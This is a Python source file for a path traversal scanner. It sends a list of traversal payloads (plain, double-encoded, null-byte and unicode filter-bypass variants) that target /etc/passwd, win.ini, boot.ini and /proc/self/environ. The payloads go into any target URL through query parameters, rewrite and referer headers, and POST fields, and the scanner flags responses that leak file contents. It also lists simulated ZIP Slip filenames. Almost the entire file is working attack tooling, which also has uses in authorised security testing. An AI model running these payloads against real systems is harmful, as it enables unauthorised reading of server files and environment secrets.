import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

TRAVERSAL_PAYLOADS = [
    # Classic
    "../../etc/passwd", "../../../../etc/passwd",
    # Double encoding
    "..%2f..%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd",
    # Windows
    "..\\..\\Windows\\win.ini", "..%5c..%5cWindows%5cwin.ini",
    "../../../../../../../../../../etc/passwd",
    "../" * 10 + "etc/passwd", "../" * 8 + "boot.ini",
    "../../../../../../../../windows/win.ini",
    # Null byte / filter bypass
    "../../etc/passwd%00", "../../etc/passwd%2500",
    "../../etc/passwd#", "../../etc/passwd/",
    # Unicode bypasses
    "..%c0%af../etc/passwd", "..%c1%9c../etc/passwd",
    "..%e0%80%af../etc/passwd", "..%uff0e%uff0e/etc/passwd",
    # Environment access
    "../../proc/self/environ"
]

HEADERS_TO_TEST = [
    "X-Original-URL", "X-Rewrite-URL", "Referer"
]

POST_PATHS = [
    "file", "path", "filename", "filepath"
]

def scan_path_traversal(target_url):
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    query = parse_qs(parsed.query)

    # Default parameter name if none exists
    param = list(query.keys())[0] if query else "file"

    findings = []
    vulnerable = False

    # 🔹 Test via GET query parameter
    for payload in TRAVERSAL_PAYLOADS:
        injected_query = {param: payload}
        full_url = base_url + "?" + urlencode(injected_query)

        try:
            res = requests.get(full_url, timeout=8)
            content = res.text.lower()

            if any(keyword in content for keyword in [
                "root:x", "[extensions]", "boot loader", "daemon", "documentroot", "path="
            ]):
                vulnerable = True
                findings.append({
                    "type": "query",
                    "payload": payload,
                    "url": full_url,
                    "snippet": res.text[:300]
                })
        except requests.RequestException:
            continue

    # 🔹 Header-based testing
    for header_name in HEADERS_TO_TEST:
        for payload in TRAVERSAL_PAYLOADS:
            try:
                headers = {header_name: payload}
                res = requests.get(target_url, headers=headers, timeout=8)
                content = res.text.lower()

                if "root:x" in content or "[extensions]" in content:
                    vulnerable = True
                    findings.append({
                        "type": "header",
                        "header": header_name,
                        "payload": payload,
                        "snippet": res.text[:300]
                    })
            except requests.RequestException:
                continue

    # 🔹 POST body testing
    for param in POST_PATHS:
        for payload in TRAVERSAL_PAYLOADS:
            try:
                data = {param: payload}
                res = requests.post(target_url, data=data, timeout=8)
                content = res.text.lower()

                if "root:x" in content or "[extensions]" in content:
                    vulnerable = True
                    findings.append({
                        "type": "post",
                        "param": param,
                        "payload": payload,
                        "snippet": res.text[:300]
                    })
            except requests.RequestException:
                continue

    # 🔹 Simulated ZIP Slip detection
    zip_payloads = [
        "../../../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
    ]
    for zip_path in zip_payloads:
        findings.append({
            "type": "zip-simulation",
            "example_zip_filename": f"/upload?filename={zip_path}",
            "note": "Simulates malicious ZIP filename. Requires manual upload test."
        })

    return {
        "target": target_url,
        "vulnerable": vulnerable,
        "findings": findings
    }
